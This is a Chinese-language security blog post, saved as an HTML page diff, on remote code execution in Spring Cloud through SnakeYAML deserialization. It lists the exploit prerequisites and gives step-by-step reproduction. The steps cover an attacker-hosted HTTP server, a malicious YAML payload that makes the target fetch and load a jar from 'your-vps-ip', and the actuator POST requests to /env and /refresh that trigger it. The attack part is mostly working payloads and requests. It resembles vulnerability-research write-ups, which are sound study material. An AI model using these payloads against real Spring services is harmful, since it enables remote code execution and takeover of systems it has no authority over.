@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Spring Cloud SnakeYAML RCE一、漏洞简介利用条件：   可以 POST 请求目标网站的 &#x2F;env 接口设置属性 可以 POST 请求目标网站的 &#x2F;refresh 接口刷新配置（存在  spring-boot-starter-actuator 依赖）   目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE   目标可以请求攻击者的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Spring Cloud SnakeYAML RCE一、漏洞简介利用条件：   可以 POST 请求目标网站的 &#x2F;env 接口设置属性 可以 POST 请求目标网站的 &#x2F;refresh 接口刷新配置（存在  spring-boot-starter-actuator 依赖）   目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE   目标可以请求攻击者的">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:03.952Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Spring Cloud/Spring Cloud SnakeYAML RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.952Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Cloud-SnakeYAML-RCE"><a href="#Spring-Cloud-SnakeYAML-RCE" class="headerlink" title="Spring Cloud SnakeYAML RCE"></a>Spring Cloud SnakeYAML RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在<br>  <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>  目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
+<li>  目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><ol>
+<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL<br> 地址</li>
+<li> refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml<br> 内容时会完成指定的动作</li>
+<li> 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory<br> 接口的类并实例化</li>
+<li> 实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP<br>服务端口（80、443）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p>
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]
+  ]]
+]
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>jar</code> 的文件<br><code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 yaml-payload</p>
+<pre><code>https://github.com/artsploit/yaml-payload
+</code></pre>
+<h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;
+</code></pre>
+<h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/" data-id="cl5c2qvmu00gzy8v15efxcva6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
